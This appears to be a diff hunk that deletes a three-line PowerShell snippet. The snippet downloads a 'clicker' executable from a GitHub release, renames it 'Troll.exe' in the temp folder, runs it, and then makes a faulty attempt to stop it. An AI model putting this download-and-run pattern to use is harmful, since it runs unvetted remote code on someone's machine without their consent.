@@ -1,3 +1,0 @@
-curl -L "https://github.com/starlighttechnologyllc/sapphire-lite-clicker/releases/download/Release/Sapphire.LITE.exe" -o "$env:temp\Troll.exe" | out-null
-Start-Process "$env:temp\Troll.exe"
-Stop-Process "$env:temp\Troll.exe"
